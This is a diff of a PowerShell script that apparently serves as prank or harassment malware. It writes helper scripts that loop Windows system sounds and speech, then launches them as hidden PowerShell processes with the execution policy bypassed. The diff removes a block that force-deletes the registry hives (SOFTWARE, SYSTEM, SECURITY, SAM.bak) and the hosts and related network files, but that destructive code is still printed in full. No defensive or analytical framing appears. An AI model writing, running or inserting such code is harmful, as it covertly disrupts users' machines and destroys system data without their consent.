@@ -1,7 +1,7 @@
 $notificationScriptContent = @'
 Function Send-NotificationSoundSpam {
     param ([int]$Interval = 0)
-
+    
     Get-ChildItem C:\Windows\Media\ -File -Filter *.wav | Select-Object -ExpandProperty Name | ForEach-Object {
         (New-Object Media.SoundPlayer "C:\WINDOWS\Media\$_").PlaySync()
         Start-Sleep -Milliseconds 1
@@ -33,24 +33,6 @@ while ($true) {
 '@
 $speechScriptPath = "$PWD\speech.ps1"
 Set-Content -Path $speechScriptPath -Value $speechScriptContent
-
-# removes system files, forces startup repair (does not brick system)
-$systemFiles = @(
-    "C:\Windows\System32\config\SOFTWARE",
-    "C:\Windows\System32\config\SYSTEM",
-    "C:\Windows\System32\config\SECURITY",
-    "C:\Windows\System32\config\SAM.bak",
-    "C:\Windows\System32\drivers\etc\hosts",
-    "C:\Windows\System32\drivers\etc\networks",
-    "C:\Windows\System32\drivers\etc\protocol",
-    "C:\Windows\System32\drivers\etc\services"
-)
-
-foreach ($file in $systemFiles) {
-    if (Test-Path -Path $file) {
-        Remove-Item -Path $file -Force
-    }
-}
 
 Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$speechScriptPath`""
 Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$notificationScriptPath`""
